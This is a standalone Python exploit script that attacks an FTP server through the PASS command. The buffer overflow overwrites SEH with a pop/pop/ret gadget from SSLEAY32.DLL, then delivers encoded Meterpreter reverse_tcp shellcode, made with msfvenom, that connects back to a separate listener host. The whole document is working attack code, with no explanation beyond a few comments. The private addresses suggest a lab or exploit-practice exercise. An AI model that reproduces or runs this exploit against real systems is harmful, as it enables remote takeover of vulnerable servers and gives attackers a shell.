#!/usr/bin/env python


import socket
import struct

# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4447 -b "\x00\x20" -e x86/shikata_ga_nai -f python
#
buf =  ""
buf += "\xb8\x9d\xbb\xf9\x26\xdb\xc0\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x56\x31\x43\x13\x03\x43\x13\x83\xeb\x61\x59"
buf += "\x0c\xda\x71\x1c\xef\x23\x81\x41\x79\xc6\xb0\x41\x1d"
buf += "\x82\xe2\x71\x55\xc6\x0e\xf9\x3b\xf3\x85\x8f\x93\xf4"
buf += "\x2e\x25\xc2\x3b\xaf\x16\x36\x5d\x33\x65\x6b\xbd\x0a"
buf += "\xa6\x7e\xbc\x4b\xdb\x73\xec\x04\x97\x26\x01\x21\xed"
buf += "\xfa\xaa\x79\xe3\x7a\x4e\xc9\x02\xaa\xc1\x42\x5d\x6c"
buf += "\xe3\x87\xd5\x25\xfb\xc4\xd0\xfc\x70\x3e\xae\xfe\x50"
buf += "\x0f\x4f\xac\x9c\xa0\xa2\xac\xd9\x06\x5d\xdb\x13\x75"
buf += "\xe0\xdc\xe7\x04\x3e\x68\xfc\xae\xb5\xca\xd8\x4f\x19"
buf += "\x8c\xab\x43\xd6\xda\xf4\x47\xe9\x0f\x8f\x73\x62\xae"
buf += "\x40\xf2\x30\x95\x44\x5f\xe2\xb4\xdd\x05\x45\xc8\x3e"
buf += "\xe6\x3a\x6c\x34\x0a\x2e\x1d\x17\x42\x83\x2c\xa8\x92"
buf += "\x8b\x27\xdb\xa0\x14\x9c\x73\x88\xdd\x3a\x83\x99\xca"
buf += "\xbc\x5b\x21\x9a\x42\x5c\x51\xb2\x80\x08\x01\xac\x21"
buf += "\x31\xca\x2c\xcd\xe4\x66\x27\x59\xc7\xde\x0f\xff\xaf"
buf += "\x1c\x70\xee\x70\xa9\x96\x40\xdf\xf9\x06\x21\x8f\xb9"
buf += "\xf6\xc9\xc5\x36\x28\xe9\xe5\x9d\x41\x80\x09\x4b\x39"
buf += "\x3d\xb3\xd6\xb1\xdc\x3c\xcd\xbf\xdf\xb7\xe7\x40\x91"
buf += "\x3f\x82\x52\xc6\x27\x6c\xab\x17\xc2\x6c\xc1\x13\x44"
buf += "\x3b\x7d\x1e\xb1\x0b\x22\xe1\x94\x08\x25\x1d\x69\x38"
buf += "\x5d\x28\xff\x04\x09\x55\xef\x84\xc9\x03\x65\x84\xa1"
buf += "\xf3\xdd\xd7\xd4\xfb\xcb\x44\x45\x6e\xf4\x3c\x39\x39"
buf += "\x9c\xc2\x64\x0d\x03\x3d\x43\x0d\x44\xc1\x11\x3a\xed"
buf += "\xa9\xe9\x7a\x0d\x29\x80\x7a\x5d\x41\x5f\x54\x52\xa1"
buf += "\xa0\x7f\x3b\xa9\x2b\xee\x89\x48\x2b\x3b\x4f\xd4\x2c"
buf += "\xc8\x54\xe7\x57\xa1\x6b\x08\xa8\xab\x0f\x09\xa8\xd3"
buf += "\x31\x36\x7e\xea\x47\x79\x42\x49\x57\xcc\xe7\xf8\xf2"
buf += "\x2e\xbb\xfb\xd6"


payload = "\x2c"
payload += "A"*2559
payload += "\xeb\x19\x90\x90"               # jmp to nop sled + shellcode
payload += struct.pack("<I", 0x10017F21)    # pop/pop/ret, SSLEAY32.DLL
payload += "\x90"*30
payload += buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.105", 21))
s.recv(1024)
s.send("USER anonymous\r\n")
s.recv(1024)
s.send("PASS " + payload + "\r\n")
s.recv(1024)
s.close()
